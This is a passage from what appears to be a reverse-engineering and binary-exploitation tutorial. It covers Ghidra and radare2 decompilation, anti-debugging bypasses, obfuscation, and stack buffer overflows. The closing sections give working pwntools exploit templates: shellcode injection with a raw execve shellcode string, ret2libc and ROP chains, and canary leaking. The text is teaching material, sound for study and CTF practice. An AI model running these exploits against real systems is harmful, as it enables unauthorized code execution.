temp_var = input + 5;
result = temp_var * 2;

// Usually represents:
result = (input + 5) * 2;
```

**Artifact 2: Odd casts**

```c
char *ptr;
ptr = (char *)((long)buffer & 0xffffffff);
// Usually means: 32-bit address in 64-bit register
```

**Artifact 3: Boolean conditions**

```c
if (strcmp(input, "pass") == 0) {
  bVar1 = true;
} else {
  bVar1 = false;
}
if (bVar1) { ... }

// Simplifies to:
if (strcmp(input, "pass") == 0) { ... }
```

**Artifact 4: Pointer arithmetic confusion**

```c
value = *(int *)(buffer + 0x10);
// May be array access or struct member
// Check assembly to distinguish
```

### Algorithm Extraction

**Step 10: Convert to standalone code**

**Decompiled algorithm:**

```c
int validate_key(char *input)
{
  int checksum = 0;
  int i;
  
  for (i = 0; i < 0x10; i++) {
    checksum = checksum + (int)input[i];
    checksum = checksum * 0x1337;
    checksum = checksum ^ 0xdeadbeef;
  }
  return checksum;
}
```

**Extract to Python for analysis:**

```python
def validate_key(input_bytes):
    checksum = 0
    for i in range(0x10):
        checksum = (checksum + input_bytes[i]) & 0xffffffff
        checksum = (checksum * 0x1337) & 0xffffffff
        checksum = (checksum ^ 0xdeadbeef) & 0xffffffff
    return checksum

# Brute force or reverse
target = 0x12345678
# ... solve for input that produces target
```

**Important considerations:**

- Preserve integer sizes (32-bit vs 64-bit)
- Maintain overflow behavior (use `& 0xffffffff` for 32-bit)
- Check signed vs unsigned operations
- Verify endianness for multi-byte operations

### Decompiler-Assisted Vulnerability Finding

**Step 11: Pattern-based vulnerability search**

**Buffer overflow detection:**

```c
void vulnerable_function(void)
{
  char buffer[32];
  
  gets(buffer);              // Dangerous: No bounds check
  printf(buffer);            // Dangerous: Format string
}
```

**Search in Ghidra:**

```
Search → Program Text → "gets("
Search → Program Text → "strcpy("
```

**Format string vulnerability:**

```c
// Direct user input to printf
void print_user_input(char *input)
{
  printf(input);             // Vulnerable
  // Should be: printf("%s", input);
}
```

**Integer overflow leading to buffer overflow:**

```c
void process_data(int size)
{
  char *buffer;
  
  // size is user-controlled
  buffer = malloc(size * 4);  // Integer overflow if size > 0x3fffffff
  read_data(buffer, size);    // May write beyond allocated size
}
```

**Use-after-free:**

```c
void vulnerable_uaf(void)
{
  char *ptr;
  
  ptr = malloc(0x20);
  free(ptr);
  // ... no ptr = NULL
  strcpy(ptr, "data");        // Use after free
}
```

**Double free:**

```c
void double_free_vuln(char *input)
{
  char *buf1, *buf2;
  
  buf1 = malloc(0x20);
  buf2 = buf1;                // Aliasing
  
  if (condition) {
    free(buf1);
  }
  free(buf2);                 // May double-free if condition true
}
```

### Optimizing Decompilation Quality

**Step 12: Ghidra analysis options**

**Re-run analysis with custom options:**

```
Analysis → Auto Analyze → Configure

Enable aggressive options:
☑ Decompiler Parameter ID (aggressive)
☑ Non-Returning Functions - Discovered
☑ Reference (aggressive)
☑ Stack (aggressive)
```

**Create function where missed:**

```
Navigate to suspicious code without function
Press 'F' → Create Function
Re-analyze decompilation
```

**Fix misdetected instruction boundaries:**

```
If decompilation looks wrong:
1. Check assembly listing
2. Clear → 'C' key (Clear Code Bytes)
3. Disassemble → 'D' key
4. Create Function → 'F' key
```

### Manual Decompilation Techniques

**When decompiler fails or unavailable:**

**Pattern recognition in assembly:**

**Example 1: Simple comparison**

```assembly
  cmp    dword ptr [rbp-0x4], 0x1337
  jne    fail_branch
  call   win_function
```

**Manual decompilation:**

```c
if (local_variable == 0x1337) {
    win_function();
}
```

**Example 2: Loop structure**

```assembly
  mov    dword ptr [rbp-0x4], 0      ; i = 0
loop_start:
  cmp    dword ptr [rbp-0x4], 0xa    ; i < 10?
  jge    loop_end
  ; ... loop body ...
  add    dword ptr [rbp-0x4], 1      ; i++
  jmp    loop_start
loop_end:
```

**Manual decompilation:**

```c
for (int i = 0; i < 10; i++) {
    // loop body
}
```

**Example 3: Switch statement**

```assembly
  mov    eax, [rbp-0x8]
  cmp    eax, 3
  ja     default_case
  mov    rax, [jump_table + rax*8]
  jmp    rax
```

**Manual decompilation:**

```c
switch (variable) {
    case 0: /* ... */ break;
    case 1: /* ... */ break;
    case 2: /* ... */ break;
    case 3: /* ... */ break;
    default: /* ... */
}
```

### Decompilation of Obfuscated Code

**Common obfuscation patterns:**

**Stack string construction:**

```c
// Instead of direct string reference
local_48 = 0x64726f7773736170;  // "password" in hex
local_40 = 0x0000000000000000;
strcmp(input, (char *)&local_48);

// Deobfuscated:
strcmp(input, "password");
```

**Constant unfolding:**

```c
// Obfuscated constant
value = ((0x1337 ^ 0xdead) + 0xbeef) * 2;

// Actually:
value = 0x12345;  // Compute at analysis time
```

**Opaque predicates:**

```c
// Always true condition used for obfuscation
if ((x * x) % 2 == 0) {  // Always true
    real_code();
}
```

**Simplify by:**

- Recognizing mathematical identities
- Computing constants manually
- Removing dead branches

### Decompilation Validation

**Step 13: Cross-check with dynamic analysis**

**Verify decompiled logic:**

```c
// Decompiler says:
if (strcmp(input, "password") == 0) {
    win();
}
```

**Validate with ltrace:**

```bash
ltrace ./binary
# Should show: strcmp("test", "password") = ...
# Confirms decompiled strcmp parameters correct
```

**Verify structure offsets:**

```c
// Decompiler says field at offset 0x28
int flag = data->admin_flag;  // Offset 0x28
```

**Validate in GDB:**

```gdb
b *function+offset
run
p/x (char*)data + 0x28
x/wx (char*)data + 0x28
# Confirm access at +0x28 actually occurs
```

### Decompilation Best Practices

**Workflow summary:**

1. **Initial pass:** Read through raw output, understand general flow
2. **Rename phase:** Functions → Variables → Structure members
3. **Type correction:** Fix integer sizes, pointer types, structure definitions
4. **Simplification:** Remove temporary variables, consolidate logic
5. **Comment phase:** Add comments at complex sections
6. **Validation phase:** Cross-check with dynamic analysis
7. **Extraction phase:** Convert algorithms to Python/C for testing

**Common pitfalls:**

- **Over-trusting decompiler:** Always verify critical logic in assembly
- **Ignoring type mismatches:** Wrong types can hide vulnerabilities
- **Missing context:** Decompiler doesn't show register constraints
- **Optimized code artifacts:** Compiler optimizations create confusing patterns

[Inference] Decompiler output quality varies significantly based on binary characteristics (stripped vs not stripped, optimization level, obfuscation), requiring analyst judgment on reliability.

### Decompilation for Exploit Development

**Using decompilation to plan exploits:**

**Step 1: Identify vulnerability in decompiled code**

```c
void vulnerable(void)
{
  char buffer[32];
  gets(buffer);  // Buffer overflow
}
```

**Step 2: Check assembly for precise details**

```assembly
sub    rsp, 0x20                  ; Allocates 32 bytes
lea    rdi, [rbp-0x20]           ; Buffer starts at rbp-0x20
call   gets
```

**Stack layout calculation:**

```
[rbp-0x20] : buffer[0]
[rbp-0x1c] : buffer[4]
...
[rbp-0x00] : saved RBP (8 bytes)
[rbp+0x08] : return address (8 bytes)
```

**Overflow distance:** 32 bytes (buffer) + 8 bytes (saved RBP) = 40 bytes to return address

**Step 3: Construct exploit using layout**

```python
from pwn import *

payload = b'A' * 40           # Fill buffer + saved RBP
payload += p64(0x401337)      # Overwrite return address with win function

p = process('./binary')
p.sendline(payload)
```

**Decompilation provided:**

- Vulnerability type (gets)
- Buffer size (32)
- Assembly confirmed precise stack layout

---

**Critical related topics:**

- **Calling conventions** (cdecl, stdcall, fastcall, x64 System V ABI)
- **Compiler optimizations** (understanding -O2/-O3 artifacts)
- **Anti-disassembly techniques** (junk bytes, overlapping instructions, indirect calls)

---

## Pattern Recognition in Binaries

Pattern recognition identifies functional boundaries, data structures, and code organization without symbols, enabling rapid vulnerability surface mapping in stripped binaries.

**Function prologue/epilogue recognition**

Standard x86-64 function patterns appear consistently across compilations:

```bash
objdump -d /path/to/binary | grep -A 2 "push.*rbp"
```

Common prologue pattern:

```
push rbp
mov rbp, rsp
sub rsp, 0x20
```

This establishes stack frame. Function epilogue pattern:

```
leave
ret
```

Or explicitly:

```
mov rsp, rbp
pop rbp
ret
```

In radare2, automatic function detection leverages these patterns:

```bash
r2 /path/to/binary
> aaa                    # Auto-analyze—finds functions via prologue detection
> afl                    # List found functions
> pdf @ function_addr    # Print disassembly
```

**ARM/Thumb function prologue differences**

ARM lacks dedicated stack frame pointer patterns. Thumb mode indicators appear as LSB set addresses:

```bash
readelf -s /path/to/binary | grep -E "FUNC|OBJECT"
```

Symbol table reveals function boundaries. For stripped binaries, cross-references and branch patterns identify function calls.

**Loop pattern recognition**

Loops generate distinctive backward jumps:

```bash
objdump -d /path/to/binary | grep "jle\|jne\|jmp"
```

Conditional jumps with lower targets indicate loop backbranches. Loop counter patterns typically show:

```
mov ecx, 0x100        # Counter initialization
.loop:
...
dec ecx
jne .loop              # Conditional backward jump
```

Radare2 identifies loop structures:

```bash
r2 /path/to/binary
> aaa
> pdf @ function_addr
```

Loop visualization appears in output as labeled backward jumps.

**Calling convention patterns**

x86-64 System V ABI (Linux):

- First 6 integer arguments: RDI, RSI, RDX, RCX, R8, R9
- Return value: RAX

Recognition pattern:

```
mov rdi, [some_value]      # First argument
mov rsi, [another_value]   # Second argument
call function
```

Windows x64 calling convention:

- First 4 arguments: RCX, RDX, R8, R9

ARM calling convention:

- First 4 arguments: R0-R3
- Return: R0

Identifying these patterns reveals argument count and potential function signatures.

**String reference patterns**

Strings often reside in `.rodata` section with predictable references:

```bash
strings /path/to/binary
```

To locate string references in code:

```bash
r2 /path/to/binary
> aaa
> iz                      # List strings in data sections
> axt @ 0x[string_addr]   # Find cross-references to address
```

Error messages, format strings, and debug output locate critical code sections:

```bash
r2 /path/to/binary
> / "error"               # Search for string
> axt @ hit_address       # Show where string is referenced
```

**Stack frame patterns**

Functions with local variables allocate stack space:

```
sub rsp, 0x100            # Allocate 256 bytes
mov [rbp-0x8], rax        # Store value 8 bytes below RBP
mov rax, [rbp-0x10]       # Retrieve value 16 bytes below
```

Pattern indicates variable count and layout. Negative offsets from RBP represent local variables. Offsets beyond RBP represent parameters.

**Data structure inference**

Repeated offset patterns suggest structure members:

```
mov rax, [rdi]            # Offset 0
mov rbx, [rdi+0x8]        # Offset 8
mov rcx, [rdi+0x10]       # Offset 16
```

Indicates 8-byte aligned structure with at least 3 members. Consistent offset increments reveal member sizes.

**Arithmetic operation sequences**

Specific patterns indicate algorithms:

XOR operations in loops: encryption/obfuscation

```
mov ecx, 0x100
.loop:
xor [rdi+rcx], al
dec ecx
jne .loop
```

Multiplication/division chains: hash computation or cryptographic operations

```
imul rax, rbx
add rax, rcx
```

**Radare2 pattern matching**

Search for specific byte patterns:

```bash
r2 /path/to/binary
> /x 55489bec            # Search for "push rbp; mov rbp, rsp" pattern
> /x 48c7c0            # mov rax, immediate pattern
```

---

## Library Function Identification

Identifying libc and external function calls reveals exploitation vectors, handles, and bypass opportunities. Stripped binaries require heuristic-based function recognition.

**Symbol table extraction**

Non-stripped binaries contain complete function information:

```bash
nm /path/to/binary | grep -i function
readelf -s /path/to/binary | grep FUNC
objdump -t /path/to/binary | grep -i function
```

Output reveals function addresses and types. For stripped binaries, this step provides no useful information.

**PLT (Procedure Linkage Table) analysis**

Dynamically linked binaries use PLT for external function calls:

```bash
objdump -d /path/to/binary | grep -A 3 "@plt"
readelf -r /path/to/binary | grep JUMP_SLOT
```

Example output:

```
0000000000401000 <printf@plt>:
  401000:	ff 25 f2 2f 00 00    	jmp    QWORD PTR [rip+0x2ff2]
  401006:	68 00 00 00 00       	push   0x0
  40100b:	e9 e0 ff ff ff       	jmp    4010f0
```

This reveals all imported external functions. Cross-references show where each function is called:

```bash
r2 /path/to/binary
> aaa
> axt @ 0x401000         # Find all references to printf@plt
```

**GOT (Global Offset Table) inspection**

```bash
objdump -R /path/to/binary | grep -E "JUMP_SLOT|GLOB_DAT"
readelf -r /path/to/binary | head -20
```

Lists function addresses and relocation types. GOT overwrite targets appear here during exploitation planning.

**Radare2 imported function analysis**

```bash
r2 /path/to/binary
> aaa
> ii                     # List imported functions
> il                     # List imported libraries
```

Faster than manual parsing, provides organized function listing.

**Function call pattern matching (stripped binaries)**

Without symbols, heuristic matching identifies libc functions. Common function signatures:

**strlen pattern:**

```
mov eax, 0
.loop:
cmp byte [rdi+rax], 0
je .end
inc rax
jmp .loop
.end:
ret
```

**memcpy/strcpy loop:**

```
xor ecx, ecx
.loop:
mov al, [rsi+rcx]
mov [rdi+rcx], al
inc rcx
cmp rcx, rdx
jne .loop
ret
```

[Inference] Pattern matching tools like FLIRT (Fast Library Identification and Recognition Technology) employ signature databases to identify standard library functions in stripped binaries. Radare2 supports FLIRT signatures:

```bash
r2 /path/to/binary
> aaa
> z~flirt                # Apply FLIRT analysis (if signatures loaded)
```

**Instruction sequence recognition**

Specific instruction patterns correlate with functions:

**malloc pattern:** memory allocation request followed by pointer return **free pattern:** pointer validation followed by memory deallocation **exit pattern:** mov edi, exit_code; call exit

```bash
r2 /path/to/binary
> aaa
> pdf @ function_addr    # Examine specific function disassembly
```

Compare observed patterns against known library function implementations.

**Stack manipulation analysis**

Library functions typically follow predictable stack management:

```
Entry: RSP points to return address
Sub RSP for local variables/spill space
Preserve callee-saved registers (if used)
Exit: Restore registers, add RSP, ret
```

Deviation from this pattern indicates custom code or inline optimization.

**Indirect call resolution**

Functions called through function pointers require more analysis:

```bash
r2 /path/to/binary
> aaa
> afi @ function_addr    # Get function info including indirect calls
```

Trace data flow to determine pointed function. Complex control flow requires dynamic analysis:

```bash
gdb ./binary
(gdb) break *0x[call_address]
(gdb) run
(gdb) info registers rax    # Check target before indirect call
(gdb) x/i $rax              # Disassemble target
```

**Version identification via function behavior**

Libc implementation details reveal version:

```bash
ldd /path/to/binary
strings /path/to/binary | grep "GLIBC_"
readelf -V /path/to/binary | grep GLIBC
```

Different glibc versions implement functions with subtle variations affecting exploitation (e.g., malloc structure changes).

**Cross-reference analysis**

Functions frequently called indicate critical paths:

```bash
r2 /path/to/binary
> aaa
> axt @ 0x[function_addr]  # Find all references
```

High cross-reference counts suggest core functionality.

---

## Anti-Debugging Detection

Anti-debugging techniques prevent dynamic analysis. Recognizing and bypassing these protections is essential for runtime exploitation verification.

**ptrace-based detection**

The most common anti-debugging mechanism:

```c
if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
    exit(1);  // Debugger detected
}
```

Disassembly pattern:

```
lea rdi, [rel ptrace_name]
xor eax, eax
call ptrace@plt
cmp eax, -1
je .exit_or_skip_section
```

**Detection in assembly:**

```bash
objdump -d /path/to/binary | grep -B 5 -A 5 "ptrace"
r2 /path/to/binary
> / "ptrace"              # Search for string reference
> axt @ 0x[addr]          # Find code references
```

**Bypass via gdb:**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) catch syscall ptrace
(gdb) commands
> set $rax = 0            # Fake success return
> continue
> end
```

Alternatively, set breakpoint on ptrace and modify return:

```bash
(gdb) break *0x[ptrace_call_address]
(gdb) run
(gdb) commands
> set $rax = 0
> continue
> end
```

**Bypass via strace wrapping:**

```bash
strace -e trace=ptrace ./binary 2>&1 | less
```

Observe ptrace calls. Modify via gdb at runtime or patch binary.

**parent process ID checks**

Anti-debugging verifies PPID (parent process ID):

```c
if (getppid() != expected_parent_pid) {
    exit(1);
}
```

Detection pattern in radare2:

```bash
r2 /path/to/binary
> / "getppid"
> axt @ hit_address
```

**Bypass:**

```bash
gdb ./binary
(gdb) break getppid
(gdb) commands
> set $rax = [parent_pid]
> continue
> end
(gdb) run
```

**/proc/self/status inspection**

Binary checks tracer status via `/proc/self/status`:

```c
FILE *f = fopen("/proc/self/status", "r");
// Parse for "TracerPid: 0" or non-zero
```

Detection pattern:

```bash
objdump -d /path/to/binary | grep -i "status"
strings /path/to/binary | grep "TracerPid"
```

**Bypass:**

Dynamic analysis bypasses file reading via:

```bash
gdb ./binary
(gdb) break open
(gdb) commands
> if strarg(0) contains "status"
>   # Return fake file descriptor or skip operation
> end
(gdb) run
```

More reliably, use `fakechroot` or container environments where `/proc/self/status` reflects no debugger.

**SIGCHLD/SIGTRAP handler checks**

Custom signal handlers detect breakpoints:

```c
signal(SIGTRAP, handler);  // Trap handler detection
signal(SIGCHLD, handler);  // Child process monitoring
```

Pattern recognition:

```bash
r2 /path/to/binary
> / "signal"
> axt @ hit_address
```

**Bypass:**

```bash
gdb ./binary
(gdb) handle SIGTRAP nopass
(gdb) handle SIGCHLD nopass
(gdb) run
```

**Timing-based detection**

Code measures execution time to detect debugger slowdown:

```c
clock_t start = clock();
// ... code ...
if ((clock() - start) > threshold) {
    // Debugger detected
}
```

Detection pattern:

```bash
objdump -d /path/to/binary | grep "clock"
r2 /path/to/binary
> / "clock"
```

**Bypass:**

Accelerate execution or skip timing checks via breakpoints:

```bash
gdb ./binary
(gdb) break *[timing_check_address]
(gdb) run
(gdb) set $rax = small_value  # Fake elapsed time
(gdb) continue
```

**Hardware breakpoint detection**

Some anti-debug code detects dr6/dr7 (debug registers):

```c
// Check debug register status
if (read_debug_registers() != 0) {
    exit(1);
}
```

[Unverified] Direct debug register inspection from userspace requires kernel cooperation; most anti-debug implementations check observable side effects (signal delivery rate, execution variance).

**Bypass via software breakpoints:**

GDB primarily uses INT3 (0xCC) software breakpoints, avoiding hardware register modification for initial detection. Using software breakpoints avoids certain hardware-level anti-debugging checks.

**anti-debugging via LD_PRELOAD detection**

Binary detects environment variable modification:

```c
if (getenv("LD_PRELOAD") != NULL) {
    exit(1);
}
```

**Bypass:**

```bash
gdb ./binary
(gdb) run
(gdb) break main
(gdb) commands
> unset environment LD_PRELOAD
> end
(gdb) run
```

Or use `unsetenv()` via gdb call:

```bash
(gdb) call unsetenv("LD_PRELOAD")
(gdb) continue
```

**Detection via strace:**

```bash
strace -f ./binary 2>&1 | grep -E "ptrace|getppid|signal"
```

Quickly identifies implemented anti-debugging mechanisms.

---

## Obfuscation Techniques

Obfuscation complicates analysis through control flow flattening, variable renaming, dead code insertion, and encryption. Recognition enables deobfuscation strategies.

**Control flow flattening**

Original sequential code transforms into dispatcher-based execution:

```
Original:
func() {
    if (condition) {
        code_a();
    } else {
        code_b();
    }
    code_c();
}

Flattened:
dispatcher(state) {
    switch(state) {
        case 0: // entry
            if (condition) state = 1 else state = 2
            break
        case 1: code_a(); state = 3; break
        case 2: code_b(); state = 3; break
        case 3: code_c(); state = 4; break
        case 4: return
    }
}
```

**Recognition pattern:**

```bash
objdump -d /path/to/binary | grep -E "switch|jmp table"
r2 /path/to/binary
> aaa
> pdf @ dispatcher_function
```

Output shows large switch statement with numbered cases. Repeated patterns indicate dispatcher:

```
cmp eax, 0
je .case_0
cmp eax, 1
je .case_1
```

**Deobfuscation approach:**

Manual trace through dispatcher states or use symbolic execution:

```bash
r2 /path/to/binary
> aaa
> pdf @ func
# Manually follow state transitions
```

Dynamic analysis reveals actual execution path:

```bash
gdb ./binary
(gdb) break *dispatcher_addr
(gdb) run
(gdb) print $rax          # Current state
(gdb) continue
# Repeat to trace state sequence
```

**Variable renaming/mangling**

All variable names stripped or replaced with meaningless identifiers. Recognition depends on usage patterns rather than names.

**Dead code insertion**

Unreachable code clutters disassembly:

```
jmp .skip
mov rax, deadbeef
mov rbx, cafebabe
.skip:
// Actual code continues
```

**Radare2 identification:**

```bash
r2 /path/to/binary
> aaa
> e emu.write=true        # Enable emulation
> aef                     # Advanced function analysis with emulation
> pdf @ func              # Shows unreachable code grayed out
```

**Encryption/obfuscation layers**

Code decryption at runtime:

```
lea rsi, [encrypted_code]
mov rdi, rsi
mov rcx, 0x1000
xor r8, r8
.decrypt_loop:
mov al, [rsi+r8]
xor al, key_byte
mov [rdi+r8], al
inc r8
cmp r8, rcx
jne .decrypt_loop
jmp rdi                   // Jump to decrypted code
```

**Recognition:**

```bash
objdump -d /path/to/binary | grep -E "xor.*byte|loop|jmp.*reg"
```

Repeated XOR operations in loops indicate encryption. Function jump to dynamically-computed addresses suggests decryption.

**Dynamic analysis reveals decrypted code:**

```bash
gdb ./binary
(gdb) break *[jmp_to_decrypted_code]
(gdb) run
(gdb) x/100i $rax         # Disassemble at computed address
```

Decrypted code becomes visible at runtime.

**Constant obfuscation**

Constants split across multiple operations:

```
mov rax, 0xdeadbeef       // Want 0xdeadbeef
becomes:
mov rax, 0x1000
add rax, 0x2000
xor rax, 0x3000
// Result equals 0xdeadbeef
```

**Symbolic execution reveals constants:**

```bash
r2 /path/to/binary
> aaef                    # Advanced function analysis with emulation
> pdf @ func              # Shows computed values where possible
```

Manual trace in gdb:

```bash
(gdb) break *[address_after_constant_computation]
(gdb) run
(gdb) print $rax
```

**Instruction substitution**

Semantically equivalent but syntactically different instructions:

```
Original: mov rax, rbx
Obfuscated:
  xor rax, rax
  add rax, rbx
```

Recognition requires pattern matching against known substitution schemes. [Inference] Deobfuscation tools like Miasm or Triton perform semantic analysis to reconstruct original intent.

**API/function call obfuscation**

Direct function calls replaced with indirect calls through computed addresses:

```
Original: call printf
Obfuscated:
  lea rax, [printf_address_in_GOT]
  call [computed_rax]
```

**Resolution:**

```bash
r2 /path/to/binary
> aaa
> pdf @ func              # Follow indirect call
> axt @ 0x[address]       # Find cross-references
```

**Deobfuscation via dynamic execution:**

```bash
gdb ./binary
(gdb) break *[indirect_call_address]
(gdb) run
(gdb) x/i [target_register]
```

**String encryption**

Strings encrypted and decrypted at use time:

```
lea rsi, [encrypted_string]
mov rdi, rsi
xor rcx, rcx
.decrypt:
mov al, [rsi+rcx]
xor al, 0x55
mov [rdi+rcx], al
cmp al, 0
je .done
inc rcx
jmp .decrypt
.done:
call puts               // Prints decrypted string
```

**Recognition:**

```bash
strings /path/to/binary | wc -l    # Very few strings visible
objdump -d /path/to/binary | grep -E "xor.*byte.*string"
```

**Extraction:**

```bash
gdb ./binary
(gdb) break puts
(gdb) run
(gdb) x/s $rdi           # First argument to puts (the string)
```

Decrypted string visible at runtime.

**Polymorphic/metamorphic code**

Code mutates across executions. [Unverified] Runtime generation of modified code copies. Recognition requires analyzing code generation routines rather than final output.

**Approach:**

```bash
gdb ./binary
(gdb) info proc mappings          # Locate code generation memory regions
(gdb) dump memory dump.bin 0x[start] 0x[end]
(gdb) run
(gdb) info proc mappings          # Compare addresses/permissions
(gdb) dump memory dump2.bin 0x[start] 0x[end]
hexdump -C dump.bin > dump1.hex
hexdump -C dump2.bin > dump2.hex
diff dump1.hex dump2.hex           # Shows mutations
```

**Tools for deobfuscation:**

**Radare2 advanced analysis:**

```bash
r2 /path/to/binary
> aaa                    # Auto-analyze
> aaef                   # Function analysis with emulation
> e asm.pseudo = true    # Pseudo-code view
> pdf @ func             # Shows simplified disassembly
```

**Miasm (symbolic execution):**

```bash
miasm.py -m x86_64 -c /path/to/binary
```

Constructs semantic representation enabling constant/expression simplification.

**Dynamic unwrapping via execution:**

Execute binary with instrumentation capturing decrypted/deobfuscated code sections in memory for offline analysis. GDB scripting automates extraction:

```bash
gdb -batch -x extract_script.gdb ./binary > extracted.asm
```

Script contents:

```
break *[critical_function]
run
dump memory encrypted.bin 0x[start] 0x[end]
# At this point execute decryption
dump memory decrypted.bin 0x[start] 0x[end]
quit
```

Compare encrypted vs. decrypted dumps for algorithm analysis.

---

**Related reverse engineering subtopics essential for comprehensive binary analysis:** Debugger usage for instruction-level verification of identified patterns, binary modification and recompilation for testing vulnerability hypotheses, and vulnerability class pattern recognition for identifying common exploitable conditions (buffer overflows, use-after-free, integer overflows).

---

# Memory Corruption Vulnerabilities

## Stack-Based Buffer Overflow

### Vulnerability Mechanics

**Core Concept:** Writing beyond a buffer's allocated size on the stack, overwriting adjacent memory including saved frame pointer (EBP/RBP) and return address (EIP/RIP).

**Typical Vulnerable Code:**

```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
    // Other dangerous functions: gets, sprintf, scanf("%s")
}
```

**Stack Layout During Overflow:**

```
High Memory
┌─────────────────────┐
│ Function arguments  │
├─────────────────────┤
│ Return address      │ ← Target for overwrite (EIP/RIP control)
├─────────────────────┤
│ Saved EBP/RBP       │ ← Overwritten first
├─────────────────────┤
│ buffer[63]          │
│ ...                 │
│ buffer[0]           │ ← Overflow starts here
├─────────────────────┤
│ Other locals        │
└─────────────────────┘
Low Memory
```

### Identification and Analysis

**Static Analysis:**

```bash
# Find dangerous functions
objdump -d ./binary -M intel | grep -E 'call.*<(strcpy|strcat|gets|sprintf|scanf|vsprintf)@plt>'

# Check for stack canaries
objdump -d ./binary -M intel | grep 'fs:0x28'
# Absence of fs:[0x28] checks = likely no canary

# Verify protections
checksec --file=./binary
# Look for: Canary, NX, PIE status

# Source code search (if available)
grep -rn "strcpy\|gets\|sprintf" .
```

**Dynamic Analysis with GDB:**

```bash
gdb ./binary

# Set breakpoint at vulnerable function
break vulnerable_function
run $(python3 -c "print('A'*100)")

# Examine stack before overflow
x/40wx $esp  # 32-bit
x/40gx $rsp  # 64-bit

# Step through and watch corruption
ni  # Next instruction
info registers ebp eip  # Check if overwritten

# Continue to crash
c
# Segfault at 0x41414141 indicates EIP control
```

**Using pwndbg/GEF:**

```bash
# Generate cyclic pattern
cyclic 200
# or
pattern create 200

# Run with pattern
run $(cyclic 200)

# Find offset to EIP/RIP
cyclic -l 0x61616171  # Converts crash address to offset
# or
pattern offset 0x61616171

# Alternative: manual calculation
x/wx $esp  # Note overwritten return address
# Use pattern_offset in pwntools
```

### Exploitation Techniques

#### Basic Return Address Overwrite (NX Disabled)

**Exploit Strategy:**

1. Fill buffer to reach return address
2. Overwrite return address with shellcode location
3. Include shellcode in payload

**Calculating Offset:**

```bash
# Method 1: Cyclic pattern (recommended)
gdb ./binary
pattern create 200
run $(pattern create 200)
# Crash at 0x62616164
pattern offset 0x62616164
# Output: Found at offset 112

# Method 2: Manual inspection
break vulnerable_function
run AAAA
x/40wx $esp
# Count distance from buffer start to saved EIP location
```

**32-bit Exploit Template:**

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary_path = './vulnerable'
elf = ELF(binary_path)

# Shellcode (execve /bin/sh)
shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')
# Or manual shellcode:
# shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Find buffer address (in GDB or via leak)
# Method 1: Fixed address (ASLR disabled)
buffer_addr = 0xbffff100  # Example address

# Method 2: Calculate from ESP
# buffer_addr = esp_value - local_vars_size

offset = 112  # Distance to return address
nop_sled = b"\x90" * 50  # NOP sled for reliability

payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))  # Padding
payload += p32(buffer_addr)  # Overwrite return address

# Launch exploit
p = process(binary_path)
# or
# p = remote('target.com', 1337)

p.sendline(payload)
p.interactive()
```

**64-bit Exploit Template:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
binary_path = './vulnerable64'
elf = ELF(binary_path)

shellcode = asm(shellcraft.amd64.linux.sh())
buffer_addr = 0x7fffffffe100  # Example 64-bit stack address

offset = 120  # Distance to return address
nop_sled = b"\x90" * 100

payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))
payload += p64(buffer_addr)  # 64-bit address

p = process(binary_path)
p.sendline(payload)
p.interactive()
```

#### Return-to-libc (NX Enabled)

**Concept:** Redirect execution to existing code (libc functions) instead of injecting shellcode.

**32-bit ret2libc (single function call):**

```python
#!/usr/bin/env python3
from pwn import *

binary_path = './vulnerable'
elf = ELF(binary_path)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # Adjust path

# Find addresses (ASLR disabled or leaked)
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
exit_addr = libc.symbols['exit']

# For PIE/ASLR: add base addresses
# system_addr = libc_base + libc.symbols['system']

offset = 112

# Stack layout after overflow:
# [return_addr] -> system
# [fake_return] -> exit (optional cleanup)
# [arg1]        -> "/bin/sh"

payload = b"A" * offset
payload += p32(system_addr)      # Return to system()
payload += p32(exit_addr)        # Fake return address
payload += p32(bin_sh_addr)      # Argument: "/bin/sh"

p = process(binary_path)
p.sendline(payload)
p.interactive()
```

**64-bit ret2libc (requires ROP for arguments):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
binary_path = './vulnerable64'
elf = ELF(binary_path)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find gadgets
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
# or manually: pop_rdi_ret = 0x401234

system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

offset = 120

# Chain: pop "/bin/sh" into RDI, then call system
payload = b"A" * offset
payload += p64(pop_rdi_ret)      # Set up RDI
payload += p64(bin_sh_addr)      # RDI = "/bin/sh"
payload += p64(system_addr)      # Call system(rdi)

p = process(binary_path)
p.sendline(payload)
p.interactive()
```

### Advanced Stack Overflow Scenarios

#### Bypassing Stack Canaries

**Detection:**

```bash
# Check if canary present
checksec ./binary | grep CANARY

# Disassemble to see canary checks
objdump -d ./binary -M intel | grep -A 5 'fs:0x28'
# Pattern:
# mov rax, qword ptr fs:[0x28]  # Load canary
# mov qword ptr [rbp-8], rax    # Store on stack
# ...
# xor rax, qword ptr [rbp-8]    # Check before return
# je <normal_return>
# call __stack_chk_fail
```

**Bypass Method 1: Leak and Preserve Canary**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./binary')

# If format string vuln exists, leak canary
p.sendline(b"%7$p")  # Example: canary at stack offset 7
leak = p.recvline()
canary = int(leak.strip(), 16)

log.info(f"Leaked canary: {hex(canary)}")

# Build payload preserving canary
offset_to_canary = 104
offset_to_rip = 120

payload = b"A" * offset_to_canary
payload += p64(canary)           # Preserve canary
payload += b"B" * 8              # Saved RBP
payload += p64(target_address)   # Overwrite RIP

p.sendline(payload)
p.interactive()
```

**Bypass Method 2: Brute Force (32-bit, fork-based servers)**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

# Canary is 4 bytes on 32-bit (3 random bytes + null byte)
